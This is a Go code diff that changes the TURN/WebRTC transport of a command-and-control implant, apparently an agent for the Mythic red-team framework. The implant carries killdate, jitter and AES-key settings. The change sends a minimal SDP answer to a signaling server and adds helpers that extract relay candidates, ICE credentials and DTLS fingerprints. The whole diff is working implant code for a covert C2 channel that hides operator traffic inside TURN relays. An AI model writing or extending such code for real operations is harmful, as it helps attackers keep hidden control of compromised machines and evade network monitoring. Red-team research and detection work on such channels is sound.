@@ -12,6 +12,7 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -38,7 +39,6 @@ type Turnc2InitialConfig struct {
 	TurnUsername           string
 	TurnPassword           string
 	SDPOffer               string
-	OfferID                string
 	Killdate               string
 	Interval               uint
 	Jitter                 uint
@@ -73,9 +73,6 @@ func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
 	if v, ok := alias["sdp_offer"]; ok {
 		e.SDPOffer = v.(string)
 	}
-	if v, ok := alias["offer_id"]; ok {
-		e.OfferID = v.(string)
-	}
 	if v, ok := alias["killdate"]; ok {
 		e.Killdate = v.(string)
 	}
@@ -94,17 +91,28 @@ func (e *Turnc2InitialConfig) UnmarshalJSON(data []byte) error {
 	return nil
 }
 
-// OfferPayload is the decoded SDP offer from the server
+// OfferPayload is the decoded SDP offer from the server.
+// The offer_id is embedded in the payload so the agent can reference it
+// when posting its minimal answer.
 type OfferPayload struct {
+	OfferID    string           `json:"offer_id"`
 	OfferSDP   string           `json:"offer_sdp"`
 	ICEServers []pion.ICEServer `json:"ice_servers"`
+}
+
+// signalingResponse is the JSON response from the signaling server.
+type signalingResponse struct {
+	Status          string `json:"status"`
+	Error           string `json:"error,omitempty"`
+	ServerRelayAddr string `json:"server_relay_addr,omitempty"`
+	ServerRelayPort int    `json:"server_relay_port,omitempty"`
 }
 
 type C2Turnc2 struct {
 	SignalURL             string
 	SignalURI             string
 	TurnServer            string
-	TurnUsername           string
+	TurnUsername          string
 	TurnPassword          string
 	SDPOffer              string
 	OfferID               string
@@ -124,9 +132,9 @@ type C2Turnc2 struct {
 	PushChannel           chan structs.MythicMessage
 	interruptSleepChannel chan bool
 	// channel to receive messages from the data channel
-	recvChannel           chan []byte
+	recvChannel      chan []byte
 	// channel to signal data channel is open
-	dataChannelReady      chan bool
+	dataChannelReady chan bool
 }
 
 func (c *C2Turnc2) MarshalJSON() ([]byte, error) {
@@ -174,7 +182,6 @@ func init() {
 		TurnUsername:          initialConfig.TurnUsername,
 		TurnPassword:          initialConfig.TurnPassword,
 		SDPOffer:              initialConfig.SDPOffer,
-		OfferID:               initialConfig.OfferID,
 		Key:                   initialConfig.AESPSK,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
@@ -372,6 +379,14 @@ func (c *C2Turnc2) establishWebRTC() error {
 		return fmt.Errorf("SDP offer payload missing offer_sdp")
 	}
 
+	// Read the offer_id from the decoded offer payload
+	if offerPayload.OfferID != "" {
+		c.OfferID = offerPayload.OfferID
+	}
+	if c.OfferID == "" {
+		return fmt.Errorf("no offer_id found in SDP offer payload")
+	}
+
 	// Configure ICE servers - use the ones from the offer if available, otherwise use config
 	iceServers := offerPayload.ICEServers
 	if len(iceServers) == 0 && c.TurnServer != "" {
@@ -476,17 +491,46 @@ func (c *C2Turnc2) establishWebRTC() error {
 	// Get the final answer with ICE candidates
 	finalAnswer := pc.LocalDescription()
 
-	// Compress and encode the answer SDP
-	compressedAnswer, err := compressBase64([]byte(finalAnswer.SDP))
-	if err != nil {
+	// Extract the minimal answer fields from the local SDP
+	relayAddr, relayPort := extractRelayCandidate(finalAnswer.SDP)
+	if relayAddr == "" || relayPort == 0 {
 		pc.Close()
-		return fmt.Errorf("failed to compress answer: %w", err)
+		return fmt.Errorf("no relay candidate found in local SDP")
 	}
 
-	// Send the answer back to the signaling server with the offer_id
-	if err := c.sendSignalingAnswer(c.OfferID, compressedAnswer); err != nil {
+	iceUfrag, icePwd := extractICECredentials(finalAnswer.SDP)
+	if iceUfrag == "" || icePwd == "" {
 		pc.Close()
-		return fmt.Errorf("failed to send signaling answer: %w", err)
+		return fmt.Errorf("no ICE credentials found in local SDP")
+	}
+
+	fingerprint := extractFingerprint(finalAnswer.SDP)
+	if fingerprint == "" {
+		pc.Close()
+		return fmt.Errorf("no DTLS fingerprint found in local SDP")
+	}
+
+	// Send the minimal answer to the signaling server
+	sigResp, err := c.sendMinimalAnswer(c.OfferID, relayAddr, relayPort, iceUfrag, icePwd, fingerprint)
+	if err != nil {
+		pc.Close()
+		return fmt.Errorf("failed to send minimal answer: %w", err)
+	}
+
+	// Handle reconnect response — server has a new relay address
+	if sigResp.Status == "reconnect" && sigResp.ServerRelayAddr != "" && sigResp.ServerRelayPort > 0 {
+		utils.PrintDebug(fmt.Sprintf("reconnect: updating server relay to %s:%d\n",
+			sigResp.ServerRelayAddr, sigResp.ServerRelayPort))
+
+		// Trickle the server's new relay candidate
+		candidateStr := fmt.Sprintf("candidate:1 1 udp 16777215 %s %d typ relay raddr 0.0.0.0 rport 0",
+			sigResp.ServerRelayAddr, sigResp.ServerRelayPort)
+		if err := pc.AddICECandidate(pion.ICECandidateInit{
+			Candidate: candidateStr,
+		}); err != nil {
+			pc.Close()
+			return fmt.Errorf("failed to add server relay candidate: %w", err)
+		}
 	}
 
 	c.PeerConn = pc
@@ -503,42 +547,65 @@ func (c *C2Turnc2) establishWebRTC() error {
 	return nil
 }
 
-// sendSignalingAnswer POSTs the compressed SDP answer to the signaling endpoint
-func (c *C2Turnc2) sendSignalingAnswer(offerID string, compressedAnswer string) error {
+// sendMinimalAnswer POSTs the minimal answer fields to the signaling endpoint.
+// The server uses these to construct a synthetic SDP answer and trickle the
+// agent's relay candidate — no full SDP exchange needed.
+func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, iceUfrag, icePwd, fingerprint string) (*signalingResponse, error) {
 	url := fmt.Sprintf("%s%s", c.SignalURL, c.SignalURI)
 
-	sigReq := struct {
-		OfferID string `json:"offer_id"`
-		Answer  string `json:"answer"`
+	payload := struct {
+		OfferID     string `json:"offer_id"`
+		RelayAddr   string `json:"relay_addr"`
+		RelayPort   int    `json:"relay_port"`
+		ICEUfrag    string `json:"ice_ufrag"`
+		ICEPwd      string `json:"ice_pwd"`
+		Fingerprint string `json:"fingerprint"`
 	}{
-		OfferID: offerID,
-		Answer:  compressedAnswer,
+		OfferID:     offerID,
+		RelayAddr:   relayAddr,
+		RelayPort:   relayPort,
+		ICEUfrag:    iceUfrag,
+		ICEPwd:      icePwd,
+		Fingerprint: fingerprint,
 	}
 
-	reqBody, err := json.Marshal(sigReq)
+	reqBody, err := json.Marshal(payload)
 	if err != nil {
-		return fmt.Errorf("failed to marshal signaling request: %w", err)
+		return nil, fmt.Errorf("failed to marshal minimal answer: %w", err)
 	}
 
 	req, err := http.NewRequest("POST", url, bytes.NewReader(reqBody))
 	if err != nil {
-		return fmt.Errorf("failed to create request: %w", err)
+		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 	req.Header.Set("Content-Type", "application/json")
 
 	resp, err := c.httpClient().Do(req)
 	if err != nil {
-		return fmt.Errorf("signaling request failed: %w", err)
+		return nil, fmt.Errorf("signaling request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("signaling server returned %d: %s", resp.StatusCode, string(body))
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
-	utils.PrintDebug("signaling answer sent successfully\n")
-	return nil
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("signaling server returned %d: %s", resp.StatusCode, string(body))
+	}
+
+	var sigResp signalingResponse
+	if err := json.Unmarshal(body, &sigResp); err != nil {
+		return nil, fmt.Errorf("failed to parse signaling response: %w", err)
+	}
+
+	if sigResp.Status == "error" {
+		return nil, fmt.Errorf("signaling error: %s", sigResp.Error)
+	}
+
+	utils.PrintDebug(fmt.Sprintf("minimal answer sent successfully (status: %s)\n", sigResp.Status))
+	return &sigResp, nil
 }
 
 func (c *C2Turnc2) httpClient() *http.Client {
@@ -838,6 +905,48 @@ func (c *C2Turnc2) encryptMessage(msg []byte) []byte {
 func (c *C2Turnc2) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
+}
+
+// SDP parsing helpers — extract minimal answer fields from local SDP
+
+// extractRelayCandidate finds the first relay candidate in the SDP and returns its address and port.
+func extractRelayCandidate(sdp string) (string, int) {
+	re := regexp.MustCompile(`a=candidate:\S+ \d+ \S+ \d+ (\S+) (\d+) typ relay`)
+	for _, line := range strings.Split(sdp, "\n") {
+		matches := re.FindStringSubmatch(line)
+		if len(matches) >= 3 {
+			port, err := strconv.Atoi(matches[2])
+			if err == nil {
+				return matches[1], port
+			}
+		}
+	}
+	return "", 0
+}
+
+// extractICECredentials extracts ice-ufrag and ice-pwd from the SDP.
+func extractICECredentials(sdp string) (string, string) {
+	var ufrag, pwd string
+	for _, line := range strings.Split(sdp, "\n") {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "a=ice-ufrag:") {
+			ufrag = strings.TrimPrefix(line, "a=ice-ufrag:")
+		} else if strings.HasPrefix(line, "a=ice-pwd:") {
+			pwd = strings.TrimPrefix(line, "a=ice-pwd:")
+		}
+	}
+	return ufrag, pwd
+}
+
+// extractFingerprint extracts the DTLS fingerprint from the SDP.
+func extractFingerprint(sdp string) string {
+	for _, line := range strings.Split(sdp, "\n") {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "a=fingerprint:") {
+			return strings.TrimPrefix(line, "a=fingerprint:")
+		}
+	}
+	return ""
 }
 
 // Brotli compression utilities
